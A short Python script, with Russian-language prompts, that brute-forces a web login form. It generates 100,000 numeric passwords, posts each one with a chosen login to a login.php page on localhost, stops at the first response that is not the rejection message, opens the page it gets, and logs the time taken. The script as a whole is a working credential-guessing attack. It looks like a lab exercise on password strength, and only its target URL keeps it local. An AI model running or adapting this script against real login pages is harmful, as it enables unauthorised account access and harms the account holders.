# coding: utf8
import requests
import webbrowser
import time
from math import fabs
start_time=time.clock()
def generate_passwords(chars):
    with open('passwords.txt', 'x') as passwords:
        for i in range(chars):
            passwords.write(str(i) + "\n")

def auth(url, login, password):
    url = url + "login.php"
    params = {"login": login, "password": password}
    s = requests.Session()
    r = s.post(url = url, data = params)
    print( r.text)
    print(password)
    return r

try:
    generate_passwords(100000)
except FileExistsError: pass


lgn = str(input("Введите логин: "))

result = ""
url = "http://localhost/test/scripts/"
with open('passwords.txt', 'r') as passwords, open("time.txt", "a") as f:
    temp = passwords.readlines()
    for i in range(len(temp)):
        if (str((auth(url, lgn, temp[i].strip())).text) != "Неверный логин или пароль"):
            result = temp[i].strip()
            result_url = (auth(url, lgn, temp[i].strip())).url
            webbrowser.open(result_url)
            print("пароль: " + result)
            time = start_time - time.clock()
            f.write('длина пароля: {0}, время подбора {1} \n'.format(len(result), fabs(time)))

            print('Время: ' + str(fabs(time)))
            break




